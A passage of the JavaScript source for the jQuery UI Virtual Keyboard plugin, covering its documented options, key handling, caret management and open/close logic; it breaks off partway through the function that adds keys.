/*!
jQuery UI Virtual Keyboard
Version 1.16

Author: Jeremy Satterfield
Modified: Rob Garrison (Mottie on github)
-----------------------------------------
Licensed under the MIT License

Caret code modified from jquery.caret.1.02.js
Licensed under the MIT License:
http://www.opensource.org/licenses/mit-license.php
-----------------------------------------

An on-screen virtual keyboard embedded within the browser window which
will popup when a specified entry field is focused. The user can then
type and preview their input before Accepting or Canceling.

As a plugin to jQuery UI styling and theme will automatically
match that used by jQuery UI with the exception of the required
CSS listed below.

Requires:
	jQuery
	jQuery UI (position utility only) & CSS

Usage:
	$('input[type=text], input[type=password], textarea')
		.keyboard({
			layout:"qwerty",
			customLayout: {
				'default': [
					"q w e r t y {bksp}",
					"s a m p l e {shift}",
					"{accept} {space} {cancel}"
				],
				'shift' : [
					"Q W E R T Y {bksp}",
					"S A M P L E {shift}",
					"{accept} {space} {cancel}"
				]
			}
		});

Options:
	layout
		[String] specify which keyboard layout to use
		qwerty - Standard QWERTY layout (Default)
		international - US international layout
		alpha  - Alphabetical layout
		dvorak - Dvorak Simplified layout
		num    - Numerical (ten-key) layout
		custom - Uses a custom layout as defined by the customLayout option

	customLayout
		[Object] Specify a custom layout
			An Object containing a set of key:value pairs, each key is a keyset.
			The key can be one to four rows (default, shifted, alt and alt-shift) or any number of meta key sets (meta1, meta2, etc).
			The value is an array with string elements of which each defines a new keyboard row.
			Each string element must have each character or key seperated by a space.
			To include an action key, select the desired one from the list below, or define your own by adding it to the $.keyboard.keyaction variable
			In the list below where two special/"Action" keys are shown, both keys have the same action but different appearances (abbreviated/full name keys).
			Special/"Action" keys include:
				{a}, {accept} - Updates element value and closes keyboard
				{alt},{altgr} - AltGr for International keyboard
				{b}, {bksp}   - Backspace
				{c}, {cancel} - Clears changes and closes keyboard
				{clear}       - Clear input window - used in num pad
				{combo}       - Toggle combo (diacritic) key
				{dec}         - Decimal for numeric entry, only allows one decimal (optional use in num pad)
				{default}     - Switch to the default keyset
				{e}, {enter}  - Return/New Line
				{lock}        - Caps lock key
				{meta#}       - Meta keys that change the key set (# can be any integer)
				{next}        - Switch to next keyboard input/textarea
				{prev}        - Switch to previous keyboard input/textarea
				{s}, {shift}  - Shift
				{sign}        - Change sign of numeric entry (positive or negative)
				{sp:#}        - Replace # with a numerical value, adds blank space, value of 1 ~ width of one key
				{space}       - Spacebar
				{t}, {tab}    - Tab

CSS:
	Please see the keyboard.css file
*/
/*jshint browser:true, jquery:true, unused:false */
;(function($){
"use strict";
$.keyboard = function(el, options){
	var base = this, o;

	// Access to jQuery and DOM versions of element
	base.$el = $(el);
	base.el = el;

	// Add a reverse reference to the DOM object
	base.$el.data("keyboard", base);

	base.init = function(){
		base.options = o = $.extend(true, {}, $.keyboard.defaultOptions, options);

		// Shift and Alt key toggles, sets is true if a layout has more than one keyset - used for mousewheel message
		base.shiftActive = base.altActive = base.metaActive = base.sets = base.capsLock = false;
		base.lastKeyset = [false, false, false]; // [shift, alt, meta]
		// Class names of the basic key set - meta keysets are handled by the keyname
		base.rows = [ '', '-shift', '-alt', '-alt-shift' ];
		base.acceptedKeys = [];
		base.mappedKeys = {}; // for remapping manually typed in keys
		$('<!--[if lte IE 8]><script>jQuery("body").addClass("oldie");</script><![endif]--><!--[if IE]><script>jQuery("body").addClass("ie");</script><![endif]-->').appendTo('body').remove();
		base.msie = $('body').hasClass('oldie'); // Old IE flag, used for caret positioning
		base.allie = $('body').hasClass('ie'); // $.browser.msie being removed soon
		base.inPlaceholder = base.$el.attr('placeholder') || '';
		base.watermark = (typeof(document.createElement('input').placeholder) !== 'undefined' && base.inPlaceholder !== ''); // html 5 placeholder/watermark
		base.regex = $.keyboard.comboRegex; // save default regex (in case loading another layout changes it)
		base.decimal = ( /^\./.test(o.display.dec) ) ? true : false; // determine if US "." or European "," system being used
		// convert mouse repeater rate (characters per second) into a time in milliseconds.
		base.repeatTime = 1000/(o.repeatRate || 20);

		// Check if caret position is saved when input is hidden or loses focus
		// (*cough* all versions of IE and I think Opera has/had an issue as well
		base.temp = $('<input style="position:absolute;left:-9999em;top:-9999em;" type="text" value="testing">').appendTo('body').caret(3,3);
		// Also save caret position of the input if it is locked
		base.checkCaret = (o.lockInput || base.temp.hide().show().caret().start !== 3 ) ? true : false;
		base.temp.remove();
		base.lastCaret = { start:0, end:0 };

		base.temp = [ '', 0, 0 ]; // used when building the keyboard - [keyset element, row, index]

		// Bind events
		$.each('initialized beforeVisible visible change hidden canceled accepted beforeClose'.split(' '), function(i,f){
			if ($.isFunction(o[f])){
				base.$el.bind(f + '.keyboard', o[f]);
			}
		});

		// Close with esc key & clicking outside
		if (o.alwaysOpen) { o.stayOpen = true; }
		$(document).bind('mousedown.keyboard keyup.keyboard touchstart.keyboard', function(e){
			if (base.opening) { return; }
			base.escClose(e);
			// needed for IE to allow switching between keyboards smoothly
			if ( e.target && $(e.target).hasClass('ui-keyboard-input') ) {
				var kb = $(e.target).data('keyboard');
				if (kb && kb.options.openOn) {
					kb.focusOn();
				}
			}
		});

		// Display keyboard on focus
		base.$el
			.addClass('ui-keyboard-input ' + o.css.input)
			.attr({ 'aria-haspopup' : 'true', 'role' : 'textbox' });

		// add disabled/readonly class - dynamically updated on reveal
		if (base.$el.is(':disabled') || (base.$el.attr('readonly') && !base.$el.hasClass('ui-keyboard-lockedinput'))) {
			base.$el.addClass('ui-keyboard-nokeyboard');
		}
		if (o.openOn) {
			base.$el.bind(o.openOn + '.keyboard', function(){
				base.focusOn();
			});
		}

		// Add placeholder if not supported by the browser
		if (!base.watermark && base.$el.val() === '' && base.inPlaceholder !== '' && base.$el.attr('placeholder') !== '') {
			base.$el
				.addClass('ui-keyboard-placeholder') // css watermark style (darker text)
				.val( base.inPlaceholder );
		}

		base.$el.trigger( 'initialized.keyboard', [ base, base.el ] );

		// initialized with keyboard open
		if (o.alwaysOpen) {
			base.reveal();
		}

	};

	base.focusOn = function(){
		if (base.$el.is(':visible')) {
			// caret position is always 0,0 in webkit; and nothing is focused at this point... odd
			// save caret position in the input to transfer it to the preview
			base.lastCaret = base.$el.caret();
		}
		if (!base.isVisible() || o.alwaysOpen) {
			clearTimeout(base.timer);
			base.reveal();
			setTimeout(function(){ base.$preview.focus(); }, 100);
		}
	};

	base.reveal = function(){
		base.opening = true;
		// close all keyboards
		$('.ui-keyboard:not(.ui-keyboard-always-open)').hide();

		// Don't open if disabled
		if (base.$el.is(':disabled') || (base.$el.attr('readonly') && !base.$el.hasClass('ui-keyboard-lockedinput'))) {
			base.$el.addClass('ui-keyboard-nokeyboard');
			return;
		} else {
			base.$el.removeClass('ui-keyboard-nokeyboard');
		}

		// Unbind focus to prevent recursion - openOn may be empty if keyboard is opened externally
		if (o.openOn) {
			base.$el.unbind( o.openOn + '.keyboard' );
		}

		// build keyboard if it doesn't exist
		if (typeof(base.$keyboard) === 'undefined') { base.startup(); }

		// ui-keyboard-has-focus is applied in case multiple keyboards have alwaysOpen = true and are stacked
		$('.ui-keyboard-has-focus').removeClass('ui-keyboard-has-focus');
		$('.ui-keyboard-input-current').removeClass('ui-keyboard-input-current');

		base.$el.addClass('ui-keyboard-input-current');
		base.isCurrent(true);

		// clear watermark
		if (!base.watermark && base.el.value === base.inPlaceholder) {
			base.$el
				.removeClass('ui-keyboard-placeholder')
				.val('');
		}
		// save starting content, in case we cancel
		base.originalContent = base.$el.val();
		base.$preview.val( base.originalContent );

		// disable/enable accept button
		if (o.acceptValid) { base.checkValid(); }

		// get single target position || target stored in element data (multiple targets) || default, at the element
		var p, s;
		base.position = o.position;
		base.position.of = base.position.of || base.$el.data('keyboardPosition') || base.$el;
		base.position.collision = (o.usePreview) ? base.position.collision || 'fit fit' : 'flip flip';

		if (o.resetDefault) {
			base.shiftActive = base.altActive = base.metaActive = false;
			base.showKeySet();
		}

		// basic positioning before it is set by position utility
		base.$keyboard.css({ position: 'absolute', left: 0, top: 0 });

		// beforeVisible event
		base.$el.trigger( 'beforeVisible.keyboard', [ base, base.el ] );

		// show keyboard
		base.$keyboard
			.addClass('ui-keyboard-has-focus')
			.show();

		// adjust keyboard preview window width - save width so IE won't keep expanding (fix issue #6)
		if (o.usePreview && base.msie) {
			if (typeof base.width === 'undefined') {
				base.$preview.hide(); // preview is 100% browser width in IE7, so hide the damn thing
				base.width = Math.ceil(base.$keyboard.width()); // set input width to match the widest keyboard row
				base.$preview.show();
			}
			base.$preview.width(base.width);
		}

		// position after keyboard is visible (required for UI position utility) and appropriately sized
		if ($.ui.position) {
			base.$keyboard.position(base.position);
		}

		base.$preview.focus();

		base.checkDecimal();

		// get preview area line height
		// add roughly 4px to get line height from font height, works well for font-sizes from 14-36px - needed for textareas
		base.lineHeight = parseInt( base.$preview.css('lineHeight'), 10) || parseInt(base.$preview.css('font-size') ,10) + 4;

		if (o.caretToEnd) {
			s = base.originalContent.length;
			base.lastCaret = {
				start: s,
				end  : s
			};
		}

		// IE caret haxx0rs
		if (base.allie){
			// ensure caret is at the end of the text (needed for IE)
			s = base.lastCaret.start || base.originalContent.length;
			p = { start: s, end: s };
			if (!base.lastCaret) { base.lastCaret = p; } // set caret at end of content, if undefined
			if (base.lastCaret.end === 0 && base.lastCaret.start > 0) { base.lastCaret.end = base.lastCaret.start; } // sometimes end = 0 while start is > 0
			if (base.lastCaret.start < 0) { base.lastCaret = p; } // IE will have start -1, end of 0 when not focused (see demo: http://jsfiddle.net/Mottie/fgryQ/3/).
		}
		base.$preview.caret(base.lastCaret.start, base.lastCaret.end );

		base.$el.trigger( 'visible.keyboard', [ base, base.el ] );
		// opening keyboard flag; delay allows switching between keyboards without immediately closing the keyboard
		setTimeout(function(){
			base.opening = false;
			base.$preview.focus(); // for IE - doesn't seem to work =(
		}, 500);

		// return base to allow chaining in typing extension
		return base;
	};

	base.startup = function(){
		base.$keyboard = base.buildKeyboard();
		base.$allKeys = base.$keyboard.find('button.ui-keyboard-button');
		base.preview = base.$preview[0];
		base.$decBtn = base.$keyboard.find('.ui-keyboard-dec');
		base.wheel = $.isFunction( $.fn.mousewheel ); // is mousewheel plugin loaded?
		// keyCode of keys always allowed to be typed - caps lock, page up & down, end, home, arrow, insert & delete keys
		base.alwaysAllowed = [20,33,34,35,36,37,38,39,40,45,46];
		if (o.enterNavigation) { base.alwaysAllowed.push(13); } // add enter to allowed keys
		base.$preview
			.bind('keypress.keyboard', function(e){
				var k = base.lastKey = String.fromCharCode(e.charCode || e.which);
				base.$lastKey = []; // not a virtual keyboard key
				if (base.checkCaret) { base.lastCaret = base.$preview.caret(); }

				// update caps lock - can only do this while typing =(
				base.capsLock = (((k >= 65 && k <= 90) && !e.shiftKey) || ((k >= 97 && k <= 122) && e.shiftKey)) ? true : false;

				// restrict input - keyCode in keypress special keys: see http://www.asquare.net/javascript/tests/KeyCode.html
				if (o.restrictInput) {
					// allow navigation keys to work - Chrome doesn't fire a keypress event (8 = bksp)
					if ( (e.which === 8 || e.which === 0) && $.inArray( e.keyCode, base.alwaysAllowed ) ) { return; }
					if ($.inArray(k, base.acceptedKeys) === -1) { e.preventDefault(); } // quick key check
				} else if ( (e.ctrlKey || e.metaKey) && (e.which === 97 || e.which === 99 || e.which === 118 || (e.which >= 120 && e.which <=122)) ) {
					// Allow select all (ctrl-a:97), copy (ctrl-c:99), paste (ctrl-v:118) & cut (ctrl-x:120) & redo (ctrl-y:121)& undo (ctrl-z:122); meta key for mac
					return;
				}
				// Mapped Keys - allows typing on a regular keyboard and the mapped key is entered
				// Set up a key in the layout as follows: "m(a):label"; m = key to map, (a) = actual keyboard key to map to (optional), ":label" = title/tooltip (optional)
				// example: \u0391 or \u0391(A) or \u0391:alpha or \u0391(A):alpha
				if (base.hasMappedKeys) {
					if (base.mappedKeys.hasOwnProperty(k)){
						base.lastKey = base.mappedKeys[k];
						base.insertText( base.lastKey );
						e.preventDefault();
					}
				}
				base.checkMaxLength();

			})
			.bind('keyup.keyboard', function(e){
				switch (e.which) {
					// Insert tab key
					case 9 :
						// Added a flag to prevent from tabbing into an input, keyboard opening, then adding the tab to the keyboard preview
						// area on keyup. Sadly it still happens if you don't release the tab key immediately because keydown event auto-repeats
						if (base.tab && !o.lockInput) {
							$.keyboard.keyaction.tab(base);
							base.tab = false;
						} else {
							e.preventDefault();
						}
						break;

					// Escape will hide the keyboard
					case 27:
						base.close();
						return false;
				}

				// throttle the check combo function because fast typers will have an incorrectly positioned caret
				clearTimeout(base.throttled);
				base.throttled = setTimeout(function(){
					// fix error in OSX? see issue #102
					if (base.isVisible()) {
						base.checkCombos();
					}
				}, 100);

				base.checkMaxLength();
				base.$el.trigger( 'change.keyboard', [ base, base.el ] );
			})
			.bind('keydown.keyboard', function(e){
				switch (e.which) {
					// prevent tab key from leaving the preview window
					case 9 :
						if (o.tabNavigation) {
							// allow tab to pass through - tab to next input/shift-tab for prev
							return true;
						} else {
							base.tab = true; // see keyup comment above
							return false;
						}
						break; // adding a break here to make jsHint happy

					case 13:
						$.keyboard.keyaction.enter(base, null, e);
						break;

					// Show capsLock
					case 20:
						base.shiftActive = base.capsLock = !base.capsLock;
						base.showKeySet(this);
						break;

					case 86:
						// prevent ctrl-v/cmd-v
						if (e.ctrlKey || e.metaKey) {
							if (o.preventPaste) { e.preventDefault(); return; }
							base.checkCombos(); // check pasted content
						}
						break;
				}
			})
			.bind('mouseup.keyboard touchend.keyboard', function(){
				if (base.checkCaret) { base.lastCaret = base.$preview.caret(); }
			})
			.bind('mousemove.keyboard', function(){
				base.$preview.focus();
			});
			// prevent keyboard event bubbling
			base.$keyboard.bind('mousedown.keyboard click.keyboard touchstart.keyboard', function(e){
				e.stopPropagation();
			});

		// If preventing paste, block context menu (right click)
		if (o.preventPaste){
			base.$preview.bind('contextmenu.keyboard', function(e){ e.preventDefault(); });
			base.$el.bind('contextmenu.keyboard', function(e){ e.preventDefault(); });
		}

		if (o.appendLocally) {
			base.$el.after( base.$keyboard );
		} else {
			base.$keyboard.appendTo('body');
		}

		base.$allKeys
			.bind(o.keyBinding.split(' ').join('.keyboard ') + '.keyboard repeater.keyboard', function(e){
				// 'key', { action: doAction, original: n, curTxt : n, curNum: 0 }
				var txt, key = $.data(this, 'key'), action = key.action.split(':')[0];
				base.$preview.focus();
				base.$lastKey = $(this);
				base.lastKey = key.curTxt;
				// Start caret in IE when not focused (happens with each virtual keyboard button click
				if (base.checkCaret) { base.$preview.caret( base.lastCaret.start, base.lastCaret.end ); }
				if (action.match('meta')) { action = 'meta'; }
				if ($.keyboard.keyaction.hasOwnProperty(action) && $(this).hasClass('ui-keyboard-actionkey')) {
					// stop processing if action returns false (close & cancel)
					if ($.keyboard.keyaction[action](base,this,e) === false) { return; }
				} else if (typeof key.action !== 'undefined') {
					txt = base.lastKey = (base.wheel && !$(this).hasClass('ui-keyboard-actionkey')) ? key.curTxt : key.action;
					base.insertText(txt);
					if (!base.capsLock && !o.stickyShift && !e.shiftKey) {
						base.shiftActive = false;
						base.showKeySet(this);
					}
				}
				base.checkCombos();
				base.checkMaxLength();
				base.$el.trigger( 'change.keyboard', [ base, base.el ] );
				base.$preview.focus();
				e.preventDefault();
			})
			// Change hover class and tooltip
			.bind('mouseenter.keyboard mouseleave.keyboard', function(e){
				var el = this, $this = $(this),
					// 'key' = { action: doAction, original: n, curTxt : n, curNum: 0 }
					key = $.data(el, 'key');
				if (e.type === 'mouseenter' && base.el.type !== 'password' ){
					$this
						.addClass(o.css.buttonHover)
						.attr('title', function(i,t){
							// show mouse wheel message
							return (base.wheel && t === '' && base.sets) ? o.wheelMessage : t;
						});
				}
				if (e.type === 'mouseleave'){
					key.curTxt = key.original;
					key.curNum = 0;
					$.data(el, 'key', key);
					$this
						.removeClass( (base.el.type === 'password') ? '' : o.css.buttonHover) // needed or IE flickers really bad
						.attr('title', function(i,t){ return (t === o.wheelMessage) ? '' : t; })
						.find('span').text( key.original ); // restore original button text
				}
			})
			// Allow mousewheel to scroll through other key sets of the same key
			.bind('mousewheel.keyboard', function(e, delta){
				if (base.wheel) {
					var txt, $this = $(this), key = $.data(this, 'key');
					txt = key.layers || base.getLayers( $this );
					key.curNum += (delta > 0) ? -1 : 1;
					if (key.curNum > txt.length-1) { key.curNum = 0; }
					if (key.curNum < 0) { key.curNum = txt.length-1; }
					key.layers = txt;
					key.curTxt = txt[key.curNum];
					$.data(this, 'key', key);
					$this.find('span').text( txt[key.curNum] );
					return false;
				}
			})
			// using "kb" namespace for mouse repeat functionality to keep it separate
			// I need to trigger a "repeater.keyboard" to make it work
			.bind('mouseup.keyboard mouseleave.kb touchend.kb touchmove.kb touchcancel.kb', function(){
				if (base.isVisible() && base.isCurrent()) { base.$preview.focus(); }
				$(this).removeClass(o.css.buttonHover); // needed for touch devices
				base.mouseRepeat = [false,''];
				clearTimeout(base.repeater); // make sure key repeat stops!
				if (base.checkCaret) { base.$preview.caret( base.lastCaret.start, base.lastCaret.end ); }
				return false;
			})
			// prevent form submits when keyboard is bound locally - issue #64
			.bind('click.keyboard', function(){
				return false;
			})
			// no mouse repeat for action keys (shift, ctrl, alt, meta, etc)
			.filter(':not(.ui-keyboard-actionkey)')
			// mouse repeated action key exceptions
			.add('.ui-keyboard-tab, .ui-keyboard-bksp, .ui-keyboard-space, .ui-keyboard-enter', base.$keyboard)
			.bind('mousedown.kb touchstart.kb', function(){
				if (o.repeatRate !== 0) {
					var key = $(this);
					base.mouseRepeat = [true, key]; // save the key, make sure we are repeating the right one (fast typers)
					setTimeout(function() {
						if (base.mouseRepeat[0] && base.mouseRepeat[1] === key) { base.repeatKey(key); }
					}, o.repeatDelay);
				}
				return false;
			});

		// adjust with window resize
		$(window).resize(function(){
			if (base.isVisible()) {
				base.$keyboard.position(base.position);
			}
		});

	};

	base.isVisible = function() {
		if (typeof(base.$keyboard) === 'undefined') {
			return false;
		}
		return base.$keyboard.is(":visible");
	};

	// Insert text at caret/selection - thanks to Derek Wickwire for fixing this up!
	base.insertText = function(txt){
		var bksp, t, h,
			// use base.$preview.val() instead of base.preview.value (val.length includes carriage returns in IE).
			val = base.$preview.val(),
			pos = base.$preview.caret(),
			scrL = base.$preview.scrollLeft(),
			scrT = base.$preview.scrollTop(),
			len = val.length; // save original content length

		// silly IE caret hacks... it should work correctly, but navigating using arrow keys in a textarea is still difficult
		if (pos.end < pos.start) { pos.end = pos.start; } // in IE, pos.end can be zero after input loses focus
		if (pos.start > len) { pos.end = pos.start = len; }

		if (base.preview.tagName === 'TEXTAREA') {
			// This makes sure the caret moves to the next line after clicking on enter (manual typing works fine)
			if (base.msie && val.substr(pos.start, 1) === '\n') { pos.start += 1; pos.end += 1; }
			// Set scroll top so current text is in view - needed for virtual keyboard typing, not manual typing
			// this doesn't appear to work correctly in Opera
			h = (val.split('\n').length - 1);
			base.preview.scrollTop = (h>0) ? base.lineHeight * h : scrT;
		}

		bksp = (txt === 'bksp' && pos.start === pos.end) ? true : false;
		txt = (txt === 'bksp') ? '' : txt;
		t = pos.start + (bksp ? -1 : txt.length);
		scrL += parseInt(base.$preview.css('fontSize'),10) * (txt === 'bksp' ? -1 : 1);

		base.$preview
			.val( base.$preview.val().substr(0, pos.start - (bksp ? 1 : 0)) + txt + base.$preview.val().substr(pos.end) )
			.caret(t, t)
			.scrollLeft(scrL);

		if (base.checkCaret) { base.lastCaret = { start: t, end: t }; } // save caret in case of bksp

	};

	// check max length
	base.checkMaxLength = function(){
		var t, p = base.$preview.val();
		if (o.maxLength !== false && p.length > o.maxLength) {
			t = Math.min(base.$preview.caret().start, o.maxLength); 
			base.$preview.val( p.substring(0, o.maxLength) );
			// restore caret on change, otherwise it ends up at the end.
			base.$preview.caret( t, t );
			base.lastCaret = { start: t, end: t };
		}
		if (base.$decBtn.length) {
			base.checkDecimal();
		}
	};

	// mousedown repeater
	base.repeatKey = function(key){
		key.trigger('repeater.keyboard');
		if (base.mouseRepeat[0]) {
			base.repeater = setTimeout(function() {
				base.repeatKey(key);
			}, base.repeatTime);
		}
	};

	base.showKeySet = function(el){
		var key = '',
		toShow = (base.shiftActive ? 1 : 0) + (base.altActive ? 2 : 0);
		if (!base.shiftActive) { base.capsLock = false; }
		// check meta key set
		if (base.metaActive) {
			// the name attribute contains the meta set # "meta99"
			key = (el && el.name && /meta/.test(el.name)) ? el.name : '';
			// save active meta keyset name
			if (key === '') {
				key = (base.metaActive === true) ? '' : base.metaActive;
			} else {
				base.metaActive = key;
			}
			// if meta keyset doesn't have a shift or alt keyset, then show just the meta key set
			if ( (!o.stickyShift && base.lastKeyset[2] !== base.metaActive) ||
				( (base.shiftActive || base.altActive) && !base.$keyboard.find('.ui-keyboard-keyset-' + key + base.rows[toShow]).length) ) {
				base.shiftActive = base.altActive = false;
			}
		} else if (!o.stickyShift && base.lastKeyset[2] !== base.metaActive && base.shiftActive) {
			// switching from meta key set back to default, reset shift & alt if using stickyShift
			base.shiftActive = base.altActive = false;
		}
		toShow = (base.shiftActive ? 1 : 0) + (base.altActive ? 2 : 0);
		key = (toShow === 0 && !base.metaActive) ? '-default' : (key === '') ? '' : '-' + key;
		if (!base.$keyboard.find('.ui-keyboard-keyset' + key + base.rows[toShow]).length) {
			// keyset doesn't exist, so restore last keyset settings
			base.shiftActive = base.lastKeyset[0];
			base.altActive = base.lastKeyset[1];
			base.metaActive = base.lastKeyset[2];
			return;
		}
		base.$keyboard
			.find('.ui-keyboard-alt, .ui-keyboard-shift, .ui-keyboard-actionkey[class*=meta]').removeClass(o.css.buttonAction).end()
			.find('.ui-keyboard-alt')[(base.altActive) ? 'addClass' : 'removeClass'](o.css.buttonAction).end()
			.find('.ui-keyboard-shift')[(base.shiftActive) ? 'addClass' : 'removeClass'](o.css.buttonAction).end()
			.find('.ui-keyboard-lock')[(base.capsLock) ? 'addClass' : 'removeClass'](o.css.buttonAction).end()
			.find('.ui-keyboard-keyset').hide().end()
			.find('.ui-keyboard-keyset' + key + base.rows[toShow]).show().end()
			.find('.ui-keyboard-actionkey.ui-keyboard' + key).addClass(o.css.buttonAction);
		base.lastKeyset = [ base.shiftActive, base.altActive, base.metaActive ];
	};

	// check for key combos (dead keys)
	base.checkCombos = function(){
		var i, r, t, t2,
			// use base.$preview.val() instead of base.preview.value (val.length includes carriage returns in IE).
			val = base.$preview.val(),
			pos = base.$preview.caret(),
			len = val.length; // save original content length

		// silly IE caret hacks... it should work correctly, but navigating using arrow keys in a textarea is still difficult
		if (pos.end < pos.start) { pos.end = pos.start; } // in IE, pos.end can be zero after input loses focus
		if (pos.start > len) { pos.end = pos.start = len; }
		// This makes sure the caret moves to the next line after clicking on enter (manual typing works fine)
		if (base.msie && val.substr(pos.start, 1) === '\n') { pos.start += 1; pos.end += 1; }

		if (o.useCombos) {
			// keep 'a' and 'o' in the regex for ae and oe ligature (æ,œ)
			// thanks to KennyTM: http://stackoverflow.com/questions/4275077/replace-characters-to-make-international-letters-diacritics
			// original regex /([`\'~\^\"ao])([a-z])/mig moved to $.keyboard.comboRegex
			if (base.msie) {
				// old IE may not have the caret positioned correctly, so just check the whole thing
				val = val.replace(base.regex, function(s, accent, letter){
					return (o.combos.hasOwnProperty(accent)) ? o.combos[accent][letter] || s : s;
				});
			// prevent combo replace error, in case the keyboard closes - see issue #116
			} else if (base.$preview.length) {
				// Modern browsers - check for combos from last two characters left of the caret
				t = pos.start - (pos.start - 2 >= 0 ? 2 : 0);
				// target last two characters
				base.$preview.caret(t, pos.end);
				// do combo replace
				t2 = base.$preview.caret().text.replace(base.regex, function(s, accent, letter){
					return (o.combos.hasOwnProperty(accent)) ? o.combos[accent][letter] || s : s;
				});
				// add combo back
				base.$preview.val( base.$preview.caret().replace(t2) );
				val = base.$preview.val();
			}
		}

		// check input restrictions - in case content was pasted
		if (o.restrictInput && val !== '') {
			t = val;
			r = base.acceptedKeys.length;
			for (i=0; i < r; i++){
				if (t === '') { continue; }
				t2 = base.acceptedKeys[i];
				if (val.indexOf(t2) >= 0) {
					// escape out all special characters
					if (/[\[|\]|\\|\^|\$|\.|\||\?|\*|\+|\(|\)|\{|\}]/g.test(t2)) { t2 = '\\' + t2; }
					t = t.replace( (new RegExp(t2, "g")), '');
				}
			}
			// what's left over are keys that aren't in the acceptedKeys array
			if (t !== '') { val = val.replace(t, ''); }
		}

		// save changes, then reposition caret
		pos.start += val.length - len;
		pos.end += val.length - len;
		base.$preview.val(val);

		base.$preview.caret(pos.start, pos.end);

		// calculate current cursor scroll location and set scrolltop to keep it in view
		base.preview.scrollTop = base.lineHeight * (val.substring(0, pos.start).split('\n').length - 1); // find row, multiply by font-size

		base.lastCaret = { start: pos.start, end: pos.end };

		if (o.acceptValid) { base.checkValid(); }

		return val; // return text, used for keyboard closing section
	};

	// Toggle accept button classes, if validating
	base.checkValid = function(){
		var valid = true;
		if (o.validate && typeof o.validate === "function") {
			valid = o.validate(base, base.$preview.val(), false);
		}
		// toggle accept button classes; defined in the css
		base.$keyboard.find('.ui-keyboard-accept')
			[valid ? 'removeClass' : 'addClass']('ui-keyboard-invalid-input')
			[valid ? 'addClass' : 'removeClass']('ui-keyboard-valid-input');
	};

	// Decimal button for num pad - only allow one (not used by default)
	base.checkDecimal = function(){
		// Check US "." or European "," format
		if ( ( base.decimal && /\./g.test(base.preview.value) ) || ( !base.decimal && /\,/g.test(base.preview.value) ) ) {
			base.$decBtn
				.attr({ 'disabled': 'disabled', 'aria-disabled': 'true' })
				.removeClass(o.css.buttonDefault + ' ' + o.css.buttonHover)
				.addClass(o.css.buttonDisabled);
		} else {
			base.$decBtn
				.removeAttr('disabled')
				.attr({ 'aria-disabled': 'false' })
				.addClass(o.css.buttonDefault)
				.removeClass(o.css.buttonDisabled);
		}
	};

	// get other layer values for a specific key
	base.getLayers = function(el){
		var key, keys;
		key = el.attr('data-pos');
		keys = el.closest('.ui-keyboard').find('button[data-pos="' + key + '"]').map(function(){
			// added '> span' because jQuery mobile adds multiple spans inside the button
			return $(this).find('> span').text();
		}).get();
		return keys;
	};

	base.isCurrent = function(set){
		var cur = $.keyboard.currentKeyboard || false;
		if (set) {
			cur = $.keyboard.currentKeyboard = base.el;
		} else if (set === false && cur === base.el) {
			cur = $.keyboard.currentKeyboard = '';
		}
		return cur === base.el;
	};

	// Go to next or prev inputs
	// goToNext = true, then go to next input; if false go to prev
	// isAccepted is from autoAccept option or true if user presses shift-enter
	base.switchInput = function(goToNext, isAccepted){
		if (typeof o.switchInput === "function") {
			o.switchInput(base, goToNext, isAccepted);
		} else {
			var kb, stopped = false,
				all = $('.ui-keyboard-input:visible'),
				indx = all.index(base.$el) + (goToNext ? 1 : -1);
			if (indx > all.length - 1) {
				stopped = o.stopAtEnd;
				indx = 0; // go to first input
			}
			if (indx < 0) {
				stopped = o.stopAtEnd;
				indx = all.length - 1; // stop or go to last
			}
			if (!stopped) {
				base.close(isAccepted);
				kb = all.eq(indx).data('keyboard');
				if (kb && kb.options.openOn.length) {
					kb.focusOn();
				}
			}
		}
		return false;
	};

	// Close the keyboard, if visible. Pass a status of true, if the content was accepted (for the event trigger).
	base.close = function(accepted){
		if (base.isVisible()) {
			clearTimeout(base.throttled);
			var val = (accepted) ?  base.checkCombos() : base.originalContent;
			// validate input if accepted
			if (accepted && o.validate && typeof(o.validate) === "function" && !o.validate(base, val, true)) {
				val = base.originalContent;
				accepted = false;
				if (o.cancelClose) { return; }
			}
			base.isCurrent(false);
			base.$el
				.removeClass('ui-keyboard-input-current ui-keyboard-autoaccepted')
				// add "ui-keyboard-autoaccepted" to inputs
				.addClass( (accepted || false) ? accepted === true ? '' : 'ui-keyboard-autoaccepted' : '' )
				.trigger( (o.alwaysOpen) ? '' : 'beforeClose.keyboard', [ base, base.el, (accepted || false) ] )
				.val( val )
				.scrollTop( base.el.scrollHeight )
				.trigger( ((accepted || false) ? 'accepted.keyboard' : 'canceled.keyboard'), [ base, base.el ] )
				.trigger( (o.alwaysOpen) ? 'inactive.keyboard' : 'hidden.keyboard', [ base, base.el ] )
				.blur();
			if (o.openOn) {
				// rebind input focus - delayed to fix IE issue #72
				base.timer = setTimeout(function(){
					base.$el.bind( o.openOn + '.keyboard', function(){ base.focusOn(); });
					// remove focus from element (needed for IE since blur doesn't seem to work)
					if ($(':focus')[0] === base.el) { base.$el.blur(); }
				}, 500);
			}
			if (!o.alwaysOpen) {
				base.$keyboard.hide();
			}
			if (!base.watermark && base.el.value === '' && base.inPlaceholder !== '') {
				base.$el
					.addClass('ui-keyboard-placeholder')
					.val(base.inPlaceholder);
			}
		}
		return !!accepted;
	};

	base.accept = function(){
		return base.close(true);
	};

	base.escClose = function(e){
		if ( e.type === 'keyup' ) {
			return ( e.which === 27 )  ? base.close() : '';
		}
		var cur = base.isCurrent();
		// keep keyboard open if alwaysOpen or stayOpen is true - fixes mutliple always open keyboards or single stay open keyboard
		if ( !base.isVisible() || (o.alwaysOpen && !cur) || (!o.alwaysOpen && o.stayOpen && cur && !base.isVisible()) ) { return; }
		// ignore autoaccept if using escape - good idea?

		if ( e.target !== base.el && cur ) {
			// stop propogation in IE - an input getting focus doesn't open a keyboard if one is already open
			if ( base.allie ) {
				e.preventDefault();
			}
			base.close( o.autoAccept ? 'true' : false );
		}
	};

	// Build default button
	base.keyBtn = $('<button />')
		.attr({ 'role': 'button', 'aria-disabled': 'false', 'tabindex' : '-1' })
		.addClass('ui-keyboard-button');

	// Add key function
	// keyName = the name of the function called in $.keyboard.keyaction when the button is clicked
	// name = name added to key, or cross-referenced in the display options
	// newSet = keyset to attach the new button
	// regKey = true when it is not an action key
	base.addKey = function(keyName, name, regKey){
		var t, keyType, m, map, nm,
			n = (regKey === true) ? keyName : o.display[name] || keyName,
			kn = (regKey === true) ? keyName.charCodeAt(0) : keyName;
		// map defined keys - format "key(A):Label_for_key"
